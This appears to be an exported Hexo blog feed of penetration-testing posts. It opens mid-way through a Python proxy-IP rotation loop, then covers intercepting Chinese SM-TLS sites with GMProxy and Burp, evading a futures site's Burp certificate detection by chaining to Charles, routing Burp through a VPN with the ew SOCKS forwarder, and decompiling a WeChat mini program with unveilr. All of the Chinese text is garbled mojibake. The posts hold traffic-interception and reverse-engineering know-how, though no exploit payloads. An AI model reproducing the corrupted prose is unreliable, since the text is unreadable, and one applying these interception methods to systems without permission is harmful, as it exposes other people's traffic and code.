IPæ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºæå‰è¿”å›å­—ç¬¦ä¸²ä¸­çš„IP</span></span><br><span class="line">regex_str = <span class="string">r&quot;\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    response = requests.get(<span class="string">&quot;https://ipinfo.io&quot;</span>, proxies=proxies)</span><br><span class="line">    ip = re.findall(regex_str, response.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> ips:</span><br><span class="line">        ips.append(ip)</span><br><span class="line">        <span class="built_in">print</span>(ip)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023915.png" alt="image-20240410102358873">  </p>]]></content>
      
      
      <categories>
          
          <category> æ‚é¡¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> clash </tag>
            
            <tag> è´Ÿè½½å‡è¡¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡å›½å¯†ç«™ç‚¹æŠ“åŒ…æµç¨‹</title>
      <link href="/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9B%BD%E5%AF%86%E7%AB%99%E7%82%B9%E6%8A%93%E5%8C%85%E6%B5%81%E7%A8%8B/"/>
      <url>/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9B%BD%E5%AF%86%E7%AB%99%E7%82%B9%E6%8A%93%E5%8C%85%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-èƒŒæ™¯"><a href="#0x00-èƒŒæ™¯" class="headerlink" title="0x00 èƒŒæ™¯"></a>0x00 èƒŒæ™¯</h2><p>ç›®æ ‡ç«™ç‚¹ï¼šé’ˆå¯¹å›½å¯†ç«™ç‚¹ï¼Œæ­¤å¤„ä¸¾ä¾‹æŸé‡‘èå›½å¯†ç«™ç‚¹</p><p>ä½¿ç”¨å·¥å…·ï¼šGMproxyã€burp</p><p>è¯´æ˜ï¼šä½¿ç”¨GMproxyå’Œburpè”åŠ¨ï¼ŒæŠ“å–å›½å¯†ç«™ç‚¹çš„æ•°æ®åŒ…</p><h2 id="0x01-GMproxyè¯´æ˜ä¸ä½¿ç”¨"><a href="#0x01-GMproxyè¯´æ˜ä¸ä½¿ç”¨" class="headerlink" title="0x01 GMproxyè¯´æ˜ä¸ä½¿ç”¨"></a>0x01 GMproxyè¯´æ˜ä¸ä½¿ç”¨</h2><h3 id="1-è¯´æ˜"><a href="#1-è¯´æ˜" class="headerlink" title="1. è¯´æ˜"></a>1. è¯´æ˜</h3><p>ä¸ºä¿éšœé‡è¦ç³»ç»Ÿçš„å®‰å…¨ï¼Œå›½å®¶å¯†ç ç®¡ç†å±€è¦æ±‚ç›¸åº”ä¸šåŠ¡ç³»ç»Ÿè¦åšå¹¿æ³›çš„æ”¹é€ ï¼Œæ”¹ç”¨ä¸­å›½æ ‡å‡†çš„å…¬é’¥å¯†ç ç®—æ³•ã€‚å›½å¯†ç®—æ³•çš„æ”¯æŒå·²æˆä¸ºä¸šåŠ¡ç³»ç»Ÿçš„é‡è¦å®‰å…¨ä¿éšœã€‚</p><p>ä½†éšç€å›½å¯†ç½‘ç«™çš„å¢å¤šï¼ŒåŒ…æ‹¬å¾ˆå¤šå•ä½çš„åŠå…¬SSL VPNä¹Ÿé€æ­¥æ”¹é€ ä¸ºå›½å¯†SSL VPNã€‚å¾ˆå¤šå¸¸ç”¨æµè§ˆå™¨ä¸æ”¯æŒå›½å¯†SSLç½‘ç«™è®¿é—®çš„é—®é¢˜æ—¥ç›Šçªå‡ºï¼Œå¦‚Chrome ã€Edgeã€IEã€FireFoxç«ç‹ ç­‰æµè§ˆå™¨å‡ä¸èƒ½è®¿é—®å›½å¯†SSLç½‘ç«™ã€‚</p><p>â€œGMProxyâ€æ­£æ˜¯æ¥<strong>è®©ä»»æ„æµè§ˆå™¨æ”¯æŒå›½å¯†ç½‘ç«™çš„å·¥å…·</strong>ã€‚GMProxy ä¸ºç»¿è‰²è½¯ä»¶ï¼Œä¸‹è½½åè§£å‹å³å¯ä½¿ç”¨ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029361.png" alt="image-20240410102900222">  </p><h3 id="2-è½¯ä»¶ä¸‹è½½"><a href="#2-è½¯ä»¶ä¸‹è½½" class="headerlink" title="2. è½¯ä»¶ä¸‹è½½"></a>2. è½¯ä»¶ä¸‹è½½</h3><p>æœ€æ–°ç‰ˆçš„GMProxyï¼š<a href="https://www.gmproxy.cn/GMProxy.msi">https://www.gmproxy.cn/GMProxy.msi</a></p><p>è½¯ä»¶ç­¾åä¿¡æ¯ä¸º: <strong>åŒ—äº¬æ°´ç†Šè™«ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸</strong>ã€‚</p><p>GMProxy.msi SHA1:0b163a967b96a212a16b74083faf78963b35f375</p><h3 id="3-å®‰è£…è¯ä¹¦"><a href="#3-å®‰è£…è¯ä¹¦" class="headerlink" title="3. å®‰è£…è¯ä¹¦"></a>3. å®‰è£…è¯ä¹¦</h3><p>å¸®åŠ©â€“&gt;å®‰è£…è·Ÿè¯ä¹¦ï¼Œå®‰è£…åˆ° â€œå—ä¿¡ä»»çš„æ ¹è¯ä¹¦å®‰è£…æœºæ„â€ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029845.png" alt="image-20240410102913811"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029510.png" alt="image-20240410102919468">  </p><h3 id="4-è¿è¡Œ"><a href="#4-è¿è¡Œ" class="headerlink" title="4. è¿è¡Œ"></a>4. è¿è¡Œ</h3><p>ç›´æ¥ä¸‹è½½åä¹‹åï¼Œæ¡Œé¢è¿è¡Œå¿«æ·æ–¹å¼å³å¯æ‰“å¼€ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029502.png" alt="image-20240410102925460"> </p><h3 id="5-ç¼–è¾‘ç½‘å€åˆ—è¡¨"><a href="#5-ç¼–è¾‘ç½‘å€åˆ—è¡¨" class="headerlink" title="5. ç¼–è¾‘ç½‘å€åˆ—è¡¨"></a>5. ç¼–è¾‘ç½‘å€åˆ—è¡¨</h3><p>åªæœ‰åœ¨å›½å¯†ç½‘å€åˆ—è¡¨ä¸­çš„URL æ‰ä¼šå¯åŠ¨å›½å¯†SSL è½¬æ¢ï¼Œæ— è®ºè®¿é—®HTTP è¿˜æ˜¯HTTPS ï¼ŒGMProxy éƒ½ä¼šè½¬æ¢æˆå›½å¯†httpsè¿›è¡Œè®¿é—®ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029472.png" alt="image-20240410102931437"> </p><h3 id="6-å¤‡æ³¨"><a href="#6-å¤‡æ³¨" class="headerlink" title="6. å¤‡æ³¨"></a>6. å¤‡æ³¨</h3><p>è¿™ä¸ªå·¥å…·ä½¿ç”¨æœ‰æ—¶é—´é™åˆ¶ï¼Œä¼šæ¶‰åŠåˆ°è½¯ä»¶æ¿€æ´»ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029406.png" alt="image-20240410102935364"> </p><h2 id="0x02-æ™®é€šæµè§ˆå™¨è®¿é—®å›½å¯†ç«™ç‚¹"><a href="#0x02-æ™®é€šæµè§ˆå™¨è®¿é—®å›½å¯†ç«™ç‚¹" class="headerlink" title="0x02 æ™®é€šæµè§ˆå™¨è®¿é—®å›½å¯†ç«™ç‚¹"></a>0x02 æ™®é€šæµè§ˆå™¨è®¿é—®å›½å¯†ç«™ç‚¹</h2><p>â€œGMProxyâ€æ­£æ˜¯æ¥<strong>è®©ä»»æ„æµè§ˆå™¨æ”¯æŒå›½å¯†ç½‘ç«™çš„å·¥å…·</strong>ã€‚</p><p>1ã€å½“æˆ‘ä»¬ä¸ä½¿ç”¨GMProxyçš„æ—¶å€™ï¼Œä½¿ç”¨chromeæµè§ˆå™¨ï¼Œä¼šæç¤ºå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029449.png" alt="image-20240410102941397"> </p><p>2ã€ä½¿ç”¨GMProxyæ¥è®¿é—®å›½å¯†ç«™ç‚¹</p><p>ï¼ˆ1ï¼‰é¦–å…ˆï¼Œåœ¨æµè§ˆå™¨ä¸Šè®¾ç½®ä»£ç†ï¼Œå°†æµé‡è½¬å‘åˆ°GMProxyï¼ˆGMProxyé»˜è®¤ç«¯å£<strong>18080</strong>ï¼‰</p><p><img src="C:/Users/HONOR/AppData/Roaming/Typora/typora-user-images/image-20240410102946428.png" alt="image-20240410102946428"> </p><p>ï¼ˆ2ï¼‰å¼€å¯ä»£ç†ï¼Œé‡æ–°è®¿é—®å›½å¯†ç«™ç‚¹ï¼Œè®¿é—®æˆåŠŸ </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029426.png" alt="image-20240410102953367"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029629.png" alt="image-20240410102958572"> </p><h2 id="0x03-burpè”åŠ¨GMProxy"><a href="#0x03-burpè”åŠ¨GMProxy" class="headerlink" title="0x03 burpè”åŠ¨GMProxy"></a>0x03 burpè”åŠ¨GMProxy</h2><p>1ã€å¯ä»¥é€šè¿‡ç»™BurpSuite è®¾ç½®<strong>Upstream</strong> ä»£ç† ï¼Œå®ç°å¯¹å›½å¯†HTTPSçš„æµ‹è¯•</p><p>ï¼ˆè¿™å—å°† burpæŠ“åˆ°çš„æµé‡è½¬å‘åˆ°GMProxyï¼‰</p><p>User OPtions â€“&gt; UpStream proxy</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030083.png" alt="image-20240410103003046"></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030235.png" alt="image-20240410103009205"> </p><p>2ã€æµè§ˆå™¨æ­£å¸¸å¼€å¯burpä»£ç†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030629.png" alt="image-20240410103015597"> </p><p>3ã€æˆåŠŸæŠ“å–åˆ°å›½å¯†ç«™ç‚¹æµé‡ï¼Œå¹¶å¯ä»¥æ­£å¸¸è®¿é—®</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030545.png" alt="image-20240410103026503"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030816.png" alt="image-20240410103031752"> </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æŠ“åŒ… </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> burp </tag>
            
            <tag> å›½å¯†ç«™ç‚¹ </tag>
            
            <tag> GMproxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡webç«™ç‚¹æ£€æµ‹burpè¯ä¹¦æŠ“åŒ…</title>
      <link href="/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1web%E7%AB%99%E7%82%B9%E6%A3%80%E6%B5%8Bburp%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85/"/>
      <url>/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1web%E7%AB%99%E7%82%B9%E6%A3%80%E6%B5%8Bburp%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="0x00-èƒŒæ™¯"><a href="#0x00-èƒŒæ™¯" class="headerlink" title="0x00 èƒŒæ™¯"></a>0x00 èƒŒæ™¯</h2><p>ç›®æ ‡ç«™ç‚¹ï¼šæŸæœŸè´§å…¬å¸webç«™ç‚¹</p><p>å·¥å…·ï¼šcharlesã€burp</p><p>è¯´æ˜ï¼šwebç«™ç‚¹å¼€å¯burpåä¸èƒ½è®¿é—®ï¼Œä½†ä½¿ç”¨CharleæŠ“åŒ…æ­£å¸¸ã€‚</p><h2 id="0x01-åˆ†æ"><a href="#0x01-åˆ†æ" class="headerlink" title="0x01 åˆ†æ"></a>0x01 åˆ†æ</h2><p>1ã€è®¿é—®ç›®æ ‡åœ°å€ï¼šå¯ä»¥æ­£å¸¸è®¿é—®</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028089.png" alt="image-20240410102802034">  </p><p>2ã€å¼€å¯burpæŠ“åŒ…ï¼Œå‘ç°ä¸èƒ½æˆåŠŸè®¿é—®äº†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028969.png" alt="image-20240410102807932"> </p><p>3ã€ä½†æ˜¯ä½¿ç”¨charlesè¿›è¡ŒæŠ“åŒ…ï¼Œå¯ä»¥æˆåŠŸæŠ“åŒ…å¹¶è®¿é—®</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028019.png" alt="image-20240410102813961"> </p><p>4ã€æ‰€ä»¥ï¼ŒçŒœæµ‹å½“å‰ç«™ç‚¹<strong>æœ‰å¯¹burpè¯ä¹¦è¿›è¡Œæ£€æµ‹</strong>ã€‚</p><h2 id="0x02-è§£å†³åŠæ³•"><a href="#0x02-è§£å†³åŠæ³•" class="headerlink" title="0x02 è§£å†³åŠæ³•"></a>0x02 è§£å†³åŠæ³•</h2><p>åŒå±‚ä»£ç†å±è”½æ‰burpè¯ä¹¦ï¼Œè®©æµé‡ä» <strong>æµè§ˆå™¨ â€“&gt; burp â€“&gt;Charles</strong>ï¼š</p><p>1ã€é¦–å…ˆï¼Œåœ¨burpä¸Šé…ç½®ä¸Šæ¸¸ä»£ç†ï¼Œè®©burpçš„æµé‡è½¬å‘åˆ°Charlesï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028423.png" alt="image-20240410102820377"></p><p>2ã€æµè§ˆå™¨ä¸Šæ­£å¸¸å¼€å¯burpä»£ç†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028074.png" alt="image-20240410102826031"></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028705.png" alt="image-20240410102834676"></p><p>3ã€æ‰“å¼€Charlesï¼ŒCharlesé»˜è®¤ç›‘å¬8888ç«¯å£ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028678.png" alt="image-20240410102840645"> </p><p>4ã€é‡æ–°è®¿é—®åœ°å€ï¼Œå¯ä»¥æˆåŠŸè®¿é—®å¹¶æŠ“åŒ…ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028384.png" alt="image-20240410102847329">  </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æŠ“åŒ… </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡VPNä¸èµ°å…¨å±€ä»£ç†æŠ“åŒ…è§£å†³åŠæ³•</title>
      <link href="/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1VPN%E4%B8%8D%E8%B5%B0%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E6%8A%93%E5%8C%85%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
      <url>/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1VPN%E4%B8%8D%E8%B5%B0%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E6%8A%93%E5%8C%85%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="0x00-èƒŒæ™¯"><a href="#0x00-èƒŒæ™¯" class="headerlink" title="0x00 èƒŒæ™¯"></a>0x00 èƒŒæ™¯</h3><p>ç«™ç‚¹ï¼šå†…ç½‘ web ç¯å¢ƒ</p><p>è®¿é—®æ–¹å¼ï¼šæœ¬åœ°ä¸‹è½½VPNè¿æ¥ï¼Œè®¿é—®webç«™ç‚¹</p><p>é—®é¢˜ï¼šä½¿ç”¨burpæ­£å¸¸æŠ“åŒ…ï¼Œå‘ç°æ²¡æœ‰å“åº”</p><h3 id="0x01-æŠ“åŒ…åˆ†æ"><a href="#0x01-æŠ“åŒ…åˆ†æ" class="headerlink" title="0x01 æŠ“åŒ…åˆ†æ"></a>0x01 æŠ“åŒ…åˆ†æ</h3><p>1ã€é¦–å…ˆï¼Œè®¿é—®ç«™ç‚¹ï¼Œä½¿ç”¨burpæŠ“åŒ…ï¼Œå‘ç°å¯ä»¥æŠ“åˆ°è¯·æ±‚åŒ…ï¼Œä½†æ²¡æœ‰å“åº”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026848.png" alt="image-20240410102621701">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026529.png" alt="image-20240410102629496">  </p><p>2ã€åŒæ—¶ï¼Œå¼€å¯burpä»£ç†æŠ“åŒ…åï¼Œwebç«™ç‚¹ä¸èƒ½è®¿é—®ï¼›å…³é—­ä»£ç†ï¼Œåˆå¯ä»¥æ­£å¸¸è®¿é—®ï¼š</p><ul><li>å…³é—­ä»£ç†</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026082.png" alt="image-20240410102635955">  </p><ul><li>å¼€å¯ä»£ç†</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026949.png" alt="image-20240410102642920">  </p><p>3ã€é€šè¿‡wiresharkæŠ“åŒ…åˆ†æï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå½“burpæŠ“åŒ…é‡æ”¾åï¼Œæµé‡ä¸å†ç»è¿‡æˆ‘ä»¬çš„VPNï¼Œè€Œæ˜¯åœ¨å‘é€åˆ°äº†å½“å‰WIFIæ‰€åœ¨å†…ç½‘ä¸­ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026628.png" alt="image-20240410102651606">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026537.png" alt="image-20240410102657524">  </p><p>è¿™å—çš„ 10.xx.xx.48ä¸ºç›®æ ‡æµ‹è¯•åœ°å€ï¼›10.101.22.62ä¸ºå½“å‰wifiåœ°å€ã€‚</p><p>4ã€åˆæ­¥çŒœæµ‹ï¼Œæ˜¯easyconnect VPNä¸æ˜¯å…¨å±€ä»£ç†ï¼Œåªæ˜¯é’ˆå¯¹éƒ¨åˆ†exeç±»åº”ç”¨ï¼Œå¦‚æµè§ˆå™¨(chrome.exe)ã€cmd.exeç­‰åšäº†ä»£ç†ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027473.png" alt="image-20240410102709452">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027129.png" alt="image-20240410102716102">  </p><h3 id="0x02-è§£å†³åŠæ³•"><a href="#0x02-è§£å†³åŠæ³•" class="headerlink" title="0x02 è§£å†³åŠæ³•"></a>0x02 è§£å†³åŠæ³•</h3><p>ä½¿ç”¨ç«¯å£è½¬å‘å·¥å…·åšç«¯å£è½¬å‘ã€‚è®©æµé‡çš„ä¸€ä¸ªèµ°å‘ä¸ºï¼šæµè§ˆå™¨-&gt;burp-&gt;ç«¯å£è½¬å‘-&gt;VPN-&gt;æœåŠ¡ç«¯</p><ul><li>ç«¯å£è½¬å‘å·¥å…·ï¼šewï¼ˆå…¶å®ƒç±»ä¼¼å·¥å…·ä¹Ÿå¯ä»¥ï¼‰</li><li>è½¬å‘ä»£ç†ï¼šèµ°socks5ä»£ç†</li></ul><p>1ã€ä½¿ç”¨ewè®¾ç½®å…¨å±€ç«¯å£è½¬å‘</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027828.png" alt="image-20240410102723818">  </p><p>2ã€burpé…ç½®socksä»£ç†</p><p>user options â€“&gt; socks proxyï¼Œé…ç½®åŒewå³å¯</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027392.png" alt="image-20240410102730363">  </p><p>3ã€æµè§ˆå™¨å¼€å¯httpä»£ç†ï¼Œæ­£å¸¸è¯·æ±‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027207.png" alt="image-20240410102736179">  </p><p>4ã€ä½¿ç”¨burpæˆåŠŸæŠ“åŒ…</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027630.png" alt="image-20240410102742575">  </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æŠ“åŒ… </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unveilråç¼–è¯‘å¾®ä¿¡å°ç¨‹åº</title>
      <link href="/2024/04/06/unveilr%E5%8F%8D%E7%BC%96%E8%AF%91%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
      <url>/2024/04/06/unveilr%E5%8F%8D%E7%BC%96%E8%AF%91%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024241.png" alt="image-20240410102424221">  </p><p>é’ˆå¯¹ä¸å¾®ä¿¡å°ç¨‹åºï¼Œç½‘ä¸Šçš„å·¥å…·æ¯”è¾ƒå¤šï¼Œä½†ä¸ªäººæ„Ÿè§‰æ¯”è¾ƒå¥½ç”¨çš„æ˜¯ unveilr.exeã€‚ä¸‹é¢é’ˆå¯¹è¿™ä¸ªå·¥å…·ä¸»è¦ä»‹ç»ä¸€ä¸‹ä½¿ç”¨æ–¹æ³•ã€‚</p><h2 id="å®šä½å°ç¨‹åºä¸­åŠ è½½çš„-wxapkgæ–‡ä»¶"><a href="#å®šä½å°ç¨‹åºä¸­åŠ è½½çš„-wxapkgæ–‡ä»¶" class="headerlink" title="å®šä½å°ç¨‹åºä¸­åŠ è½½çš„.wxapkgæ–‡ä»¶"></a>å®šä½å°ç¨‹åºä¸­åŠ è½½çš„.wxapkgæ–‡ä»¶</h2><p>1ã€å¾®ä¿¡è®¾ç½®ä¸­æ‰¾åˆ°æ–‡ä»¶å¤¹æ‰€åœ¨ä½ç½®ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024205.png" alt="image-20240410102432189">  </p><p>2ã€å®šä½è¿‡å»ï¼Œæ‰¾åˆ°APPletæ–‡ä»¶å¤¹ï¼Œè¯¥æ–‡ä»¶å¤¹ä¸‹é¢å­˜æ”¾çš„æ˜¯å°ç¨‹åºåŠ è½½åçš„ç¼“å­˜æ–‡ä»¶ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024112.png" alt="image-20240410102439099">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024810.png" alt="image-20240410102446795">  </p><p>3ã€ç”±äºå¯èƒ½ä¹‹å‰åŠ è½½è¿‡å…¶ä»–çš„å°ç¨‹åºï¼Œåœ¨å®šä½ç›®æ ‡ç¨‹åºä¹‹å‰ï¼Œå¯ä»¥å°†APPletæ–‡ä»¶å¤¹ä¸‹å†…å®¹æ¸…ç©º</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024280.png" alt="image-20240410102453267">  </p><p>4ã€åŠ è½½ç›®æ ‡ç¨‹åºï¼Œè¿™å—ä»¥ã€xxxå°±ä¸šã€‘å°ç¨‹åºä¸ºä¾‹</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025831.png" alt="image-20240410102507813"> </p><p>5ã€è·å–åˆ°åŠ è½½çš„å°ç¨‹åº.wxakgæ–‡ä»¶</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025226.png" alt="image-20240410102515218">  </p><h2 id="unveilråç¼–è¯‘-wxakgæ–‡ä»¶"><a href="#unveilråç¼–è¯‘-wxakgæ–‡ä»¶" class="headerlink" title="unveilråç¼–è¯‘.wxakgæ–‡ä»¶"></a>unveilråç¼–è¯‘.wxakgæ–‡ä»¶</h2><p>1ã€ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼Œå¯¹ç›®æ ‡å°ç¨‹åºè¿›è¡Œåç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unveilr.exe &quot;xxxx\Applet\wxff689bf2602ab223\12&quot;   //è¿™å—ç›´æ¥å†™æ–‡ä»¶å¤¹åç§°å°±è¡Œï¼Œä¼šè‡ªåŠ¨è¯»å–åŠ è½½çš„</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025538.png" alt="image-20240410102520524">  </p><h2 id="å¾®ä¿¡å¼€å‘è€…åŠ©æ‰‹åŠ è½½è¿›è¡Œè°ƒè¯•"><a href="#å¾®ä¿¡å¼€å‘è€…åŠ©æ‰‹åŠ è½½è¿›è¡Œè°ƒè¯•" class="headerlink" title="å¾®ä¿¡å¼€å‘è€…åŠ©æ‰‹åŠ è½½è¿›è¡Œè°ƒè¯•"></a>å¾®ä¿¡å¼€å‘è€…åŠ©æ‰‹åŠ è½½è¿›è¡Œè°ƒè¯•</h2><p>1ã€æˆåŠŸåŠ è½½äº†å°ç¨‹åºï¼Œä½†æ˜¯æœ‰ä¸ªæŠ¥é”™ï¼šâ€ä¸åœ¨ä»¥ä¸‹ request åˆæ³•åŸŸååˆ—è¡¨ä¸­â€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025220.png" alt="image-20240410102526174">  </p><p>è§£å†³åŠæ³•ï¼šè¯¦æƒ…-&gt;æœ¬åœ°è®¾ç½®ï¼Œå‹¾é€‰ä¸Šä¸æ ¡éªŒåˆæ³•åŸŸåï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025042.png" alt="image-20240410102532006">  </p><p>é‡æ–°åŠ è½½å°ç¨‹åºï¼Œå‘ç°æ²¡æœ‰æŠ¥é”™äº†ï¼</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025787.png" alt="image-20240410102537744">  </p><p>2ã€ç‚¹å‡»ã€èŒä½ã€‘æ¨¡å—ï¼ŒæŠ¥é”™ â€œ Cannot read property â€˜lengthâ€™ of undefinedâ€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025628.png" alt="image-20240410102543598">  </p><p>è§£å†³åŠæ³•ï¼šå‚è€ƒå¦‚ä¸‹é“¾æ¥</p><p><a href="https://developers.weixin.qq.com/community/develop/doc/000e2e36b6c8106a882a514495d000">https://developers.weixin.qq.com/community/develop/doc/000e2e36b6c8106a882a514495d000</a></p><p>ä½¿ç”¨ res.data.result å‰ ï¼Œå…ˆä½¿ç”¨ if(res.data&amp;&amp;res.data.result) è¿›è¡Œç©ºå€¼åˆ¤æ–­ï¼Œä¸ºçœŸåç»§ç»­ä½ çš„é€»è¾‘å¤„ç†ã€‚</p><p><a href="https://blog.csdn.net/lily__an/article/details/89226181">https://blog.csdn.net/lily__an/article/details/89226181</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025509.png" alt="image-20240410102549484">  </p><p>æŒ‰ç…§è¿™ç§è§£å†³åŠæ³•ï¼Œå¯ä»¥ä¿®æ”¹JSä¸­çš„ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025348.png" alt="image-20240410102556317">  </p><p>é‡æ–°åŠ è½½ï¼Œå°±ä¼šå‘ç°ä¸å†æŠ¥é”™äº†ï¼</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026431.png" alt="image-20240410102602390">  </p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ’é”™æ€è·¯ï¼Œå°±æ˜¯å“ªé‡Œæœ‰é—®é¢˜è§£å†³å“ªé‡Œçš„é—®é¢˜ã€‚</p><p>è¿™ç§ä¸€èˆ¬ç½‘ä¸Šæ‰¾è§£å†³åŠæ³•éƒ½æ˜¯æœ‰çš„ï¼Œç™¾åº¦å°±okï¼</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> å°ç¨‹åº </tag>
            
            <tag> unveilr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexoå¼€å§‹å†™åšå®¢</title>
      <link href="/2024/03/26/hexo%E5%BC%80%E5%A7%8B%E5%86%99%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/03/26/hexo%E5%BC%80%E5%A7%8B%E5%86%99%E5%8D%9A%E5%AE%A2/</url>
      
